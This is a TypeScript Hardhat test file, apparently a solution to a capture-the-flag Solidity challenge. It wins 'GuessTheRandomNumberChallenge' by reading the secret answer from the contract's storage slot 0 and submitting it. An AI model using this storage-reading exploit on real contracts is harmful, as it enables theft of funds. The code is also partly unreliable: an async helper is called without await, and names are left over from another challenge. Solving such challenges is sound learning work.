import { time, loadFixture } from '@nomicfoundation/hardhat-network-helpers';
import { anyValue } from '@nomicfoundation/hardhat-chai-matchers/withArgs';
import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('Start Point', async function () {
  let guessNumberContract: any;

  let owner: any;
  let user1: any;
  let user2: any;

  beforeEach('Deployments', async function () {
    [owner, user1, user2] = await ethers.getSigners();
    const falloutFactory = await ethers.getContractFactory(
      'GuessTheRandomNumberChallenge'
    );

    guessNumberContract = await falloutFactory.deploy({
      value: ethers.utils.parseEther('1'),
    });
  });

  describe('Hack Fallout', async function () {
    it('Should call the guessNumberContract', async function () {
      const answer = getUint8(guessNumberContract.address);

      await guessNumberContract.connect(user1).guess(answer, {
        value: ethers.utils.parseEther('1'),
      });

      expect(await guessNumberContract.isComplete()).to.equal(true);
    });
  });
});

async function getUint8(contractAddress: string) {
  const paddedSlot = ethers.utils.hexZeroPad('0x0', 8);
  const storageLocation = await ethers.provider.getStorageAt(
    contractAddress,
    paddedSlot
  );
  const storageValue = ethers.BigNumber.from(storageLocation);
  return storageValue;
}
